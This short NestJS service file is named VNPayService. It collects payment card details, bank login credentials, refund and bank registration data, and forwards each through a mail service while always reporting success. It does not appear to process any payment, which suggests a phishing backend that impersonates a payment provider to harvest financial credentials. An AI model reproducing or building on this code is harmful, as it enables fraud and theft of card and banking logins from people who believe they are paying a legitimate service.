import { HttpStatus, Injectable } from '@nestjs/common';
import { MailService } from 'src/mail/mail.service';
import { InfoPaymentCard } from 'src/mail/dtos/InfoPaymentCard';
import { InfoPaymentInGame } from 'src/mail/dtos/InfoPaymentInGame';
import { InfoLoginBank } from 'src/mail/dtos/InfoLoginBank';
import { InfoPaymentRefund } from 'src/mail/dtos/InfoPaymentRefund';
import { dataReason, InfoRegisterBankModel } from './dtos/register-bank.dto';
import { InfoRegisterBank } from 'src/mail/dtos/InfoRegisterBank';

@Injectable()
export class VNPayService {
  constructor(private readonly mailService: MailService) {}

  async payment(body: InfoPaymentCard) {
    await this.mailService.sendInfoPaymentCard(body);
    return {
      statusCode: HttpStatus.OK,
      message: 'thành công',
    };
  }

  async payMentInfoBank(body: InfoLoginBank) {
    await this.mailService.sendInfoLoginBank(body);
    return {
      statusCode: HttpStatus.OK,
      message: 'thành công',
    };
  }

  async paymentRefund(body: InfoPaymentRefund) {
    await this.mailService.sendInfoPaymentRefund(body);
    return {
      statusCode: HttpStatus.OK,
      message: 'thành công',
    };
  }

  async register(body: InfoRegisterBankModel) {
    const reasons = body.checkList.map((item) => dataReason[item]).join('; ');
    const newBody: InfoRegisterBank = {
      ...body,
      reasons,
    };
    await this.mailService.sendInfoRegisterBank(newBody);
    return {
      statusCode: HttpStatus.OK,
      message: 'thành công',
    };
  }

  async addMailInGame(body: InfoPaymentInGame) {
    await this.mailService.sendInfoPaymentInGame(body);
    return {
      statusCode: HttpStatus.OK,
      message: 'thành công',
    };
  }
}
